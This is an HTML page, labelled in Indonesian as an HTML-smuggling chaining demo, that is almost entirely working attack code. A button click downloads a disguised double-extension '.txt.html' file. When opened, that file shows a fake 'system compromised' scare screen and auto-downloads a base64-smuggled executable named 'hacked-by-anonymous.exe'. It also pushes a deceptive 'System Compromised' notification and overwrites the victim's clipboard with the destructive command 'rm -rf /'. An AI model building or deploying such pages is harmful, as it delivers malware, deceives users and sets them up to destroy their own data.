<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Chaining: HTML Smuggling + Notification & Clipboard API</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
.panel { background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 40px auto; }
:fullscreen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; width: 100vw !important; height: 100vh !important; }
:-webkit-full-screen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; }
h2 { margin-bottom: 10px; }
p { margin-bottom: 15px; line-height: 1.5; }
button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
button:hover { background: #b71c1c; }
#status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
</style>
</head>

<body>
<div class="panel" id="main-panel">
<h2>Chaining: HTML Smuggling + Native API Abuse</h2>
<p>Mengunduh file .txt.html yang saat dibuka akan memicu unduhan file .exe dan menyalahgunakan Notification & Clipboard API.</p>

<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
<div id="status" role="status">Sistem siap.</div>
</div>

<script>
const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");

let activeUrls = [];
let isProcessing = false;

const speak = (message) => {
    if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
        const utterance = new SpeechSynthesisUtterance(message);
        utterance.lang = 'id-ID';
        window.speechSynthesis.speak(utterance);
    }
};

const prepareMimeBlobAsync = (i) => {
    return new Promise((resolve) => {
        queueMicrotask(() => {
            const payloadText = "<!DOCTYPE html>" +
            "<html>" +
            "<head><meta charset='UTF-8'><title>System Alert</title></head>" +
            "<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden;cursor:pointer'>" +
            "<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
            "<h1 style='font-size:60px;color:#f00;text-shadow:0 0 20px #f00;letter-spacing:8px;animation:pulse 1s infinite'>SYSTEM ALERT</h1>" +
            "<h2 style='font-size:28px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>WAGURI</h2>" +
            "<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Your system has been compromised.</p>" +
            "<p style='font-size:14px;color:#0f0;margin-top:10px;opacity:0.6' id='status'>Menyiapkan payload...</p>" +
            "<p style='font-size:14px;color:#ff0;margin-top:20px'>Klik di mana saja untuk memulai download</p>" +
            "<p style='font-size:12px;color:#666;margin-top:60px'>Origin: <span id='o'></span></p>" +
            "</div>" +
            "<style>" +
            "@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }" +
            "body::before { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg, rgba(0,255,0,0.03) 0px, rgba(0,255,0,0.03) 1px, transparent 1px, transparent 3px); pointer-events:none; }" +
            "</style>" +
            "<script>" +
            "(function(){" +
            "\"use strict\";" +
            "document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +

            "function b64KeBytes(b64){" +
            "    var binary = atob(b64);" +
            "    var len = binary.length;" +
            "    var bytes = new Uint8Array(len);" +
            "    for (var i = 0; i < len; i++) { bytes[i] = binary.charCodeAt(i); }" +
            "    return bytes;" +
            "}" +
            
            "var b64Data = \"TVqQAAMAAAAEAAAAAEEAAgBA\";" + // Payload EXE
            "var sudah = false;" +

            // --- CHAINING DENGAN NOTIFICATION API ---
            "function abuseNotification() {" +
            "    if (!('Notification' in window)) return;" +
            "    if (Notification.permission === 'granted') {" +
            "        new Notification('System Compromised', {" +
            "            body: 'Klik di sini untuk memperbaiki sistem Anda.'," +
            "            icon: 'https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg'" +
            "        });" +
            "    } else if (Notification.permission !== 'denied') {" +
            "        Notification.requestPermission().then(function(permission) {" +
            "            if (permission === 'granted') {" +
            "                new Notification('System Compromised', {" +
            "                    body: 'Klik di sini untuk memperbaiki sistem Anda.'" +
            "                });" +
            "            }" +
            "        });" +
            "    }" +
            "}" +

            // --- CHAINING DENGAN CLIPBOARD API ---
            "function abuseClipboard() {" +
            "    // Menimpa isi clipboard korban dengan perintah berbahaya (jika diizinkan)" +
            "    if (navigator.clipboard && navigator.clipboard.writeText) {" +
            "        navigator.clipboard.writeText('rm -rf /').catch(function(e) {" +
            "            console.log('Clipboard diblokir:', e.message);" +
            "        });" +
            "    }" +
            "}" +

            "function picuDownload(){" +
            "    if (sudah) return;" +
            "    sudah = true;" +
            "    var statusEl = document.getElementById('status');" +
            "    try{" +
            "        statusEl.textContent = 'Menyiapkan berkas...';" +
            
            // Eksekusi API lain secara paralel
            "        abuseNotification();" +
            "        abuseClipboard();" +

            "        var bytesArr = b64KeBytes(b64Data);" +
            "        var blob = new Blob([bytesArr], { type: 'application/octet-stream' });" +
            "        var url = URL.createObjectURL(blob);" +
            "        var a = document.createElement('a');" +
            "        a.href = url;" +
            "        a.download = 'hacked-by-anonymous.exe';" +
            "        a.style.display = 'none';" +
            "        document.body.appendChild(a);" +
            "        a.click();" +
            "        setTimeout(function(){ " +
            "            if (a.parentNode) a.parentNode.removeChild(a); " +
            "            URL.revokeObjectURL(url); " +
            "        }, 3000);" +
            "        statusEl.textContent = 'Payload berhasil diunduh & API dieksekusi!';" +
            "        statusEl.style.color = '#0f0';" +
            "    } catch(e){" +
            "        statusEl.textContent = 'Gagal: ' + e.message;" +
            "        statusEl.style.color = '#f00';" +
            "        sudah = false;" +
            "    }" +
            "}" +

            "window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
            "document.addEventListener('click', picuDownload);" +
            "document.addEventListener('touchstart', picuDownload);" +
            "})();" +
            "<\/script>" +
            "</body>" +
            "</html>";
          
            const blob = new Blob([payloadText], { type: "text/html" });
            const url = URL.createObjectURL(blob);
            resolve({ id: i, url: url });
        });
    });
};

const triggerInstantDownload = (fileData) => {
    const link = document.createElement("a");
    link.href = fileData.url;
    link.download = `waguri-alert-${fileData.id}.txt.html`; // Ekstensi ganda
    link.textContent = `Blob #${fileData.id} (.txt.html)`;
    link.style.display = "none";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
};

startBtn.addEventListener("click", () => {
    if (isProcessing) return;
    isProcessing = true;
    startBtn.disabled = true;
    statusDiv.textContent = "Menyiapkan file Chaining...";

    speak("Menyiapkan file dengan Native API Abuse.");

    const root = document.documentElement;
    try { if (root.requestFullscreen) root.requestFullscreen(); } catch (e) {}

    setTimeout(async () => {
        try {
            const fileData = await prepareMimeBlobAsync(1);
            activeUrls.push(fileData.url);
            triggerInstantDownload(fileData);
            statusDiv.textContent = "File berhasil diunduh.";
        } catch(e) {
            statusDiv.textContent = "Gagal: " + e.message;
        }
        isProcessing = false;
        startBtn.disabled = false;
    }, 300);
});
</script>
</body>
</html>
